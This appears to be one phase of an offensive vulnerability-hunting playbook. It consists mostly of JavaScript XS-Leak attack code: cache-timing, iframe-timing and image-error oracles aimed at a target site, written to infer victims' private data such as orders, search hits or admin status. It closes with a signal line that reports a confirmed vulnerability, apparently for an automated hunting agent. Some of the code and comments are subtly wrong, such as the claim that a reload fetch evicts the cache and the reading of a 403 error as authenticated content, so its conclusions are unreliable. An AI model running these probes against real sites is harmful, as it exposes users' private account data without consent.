# ZDH Phase 30: XS-Leaks & Cross-Site Side Channels

## Phase 30 - XS-Leaks & Cross-Site Side Channels (DEF CON 29 / USENIX 2022)

**Leak authenticated user data cross-origin without any JavaScript execution on target.**

```javascript
// XS-Leaks: infer cross-origin state via timing, cache, or error behaviors
// Use case: determine if victim has specific data (email registered, order exists, is admin)

// Cache Probing (most reliable):
async function probeCache(url) {
  // Evict from cache
  await fetch(url, {mode: 'no-cors', cache: 'reload'});
  await new Promise(r => setTimeout(r, 200));
  // Measure re-load time
  const start = performance.now();
  await fetch(url, {mode: 'no-cors', cache: 'force-cache'});
  return performance.now() - start;
}
// <5ms = cache hit (data exists), >50ms = cache miss
const time = await probeCache("https://target.com/api/orders?id=12345");
console.log(time < 10 ? "ORDER EXISTS" : "NO ORDER");

// iframe load timing (different page size = different load time):
function timeiframe(url) {
  return new Promise(resolve => {
    const start = performance.now();
    const iframe = document.createElement('iframe');
    iframe.onload = () => resolve(performance.now() - start);
    iframe.src = url;
    document.body.appendChild(iframe);
  });
}
const t = await timeiframe("https://target.com/search?q=secret@corp.com");
// Larger response (result found) = longer load time

// Error oracle (authentication check via cross-origin image):
const img = new Image();
img.onerror = () => console.log("AUTHENTICATED CONTENT (403 from unauth request)");
img.onload  = () => console.log("PUBLIC (200 response)");
img.src = "https://target.com/api/admin/secret-resource";

// Network timing oracle:
// Run 20 probes, take median - consistent >20ms delta = information leakage confirmed
```

**Signal:** `emit_signal VULN_CONFIRMED "XS-Leak: cache probe confirms <data-type> existence for victim" "main/zerodayhunt" 0.82`
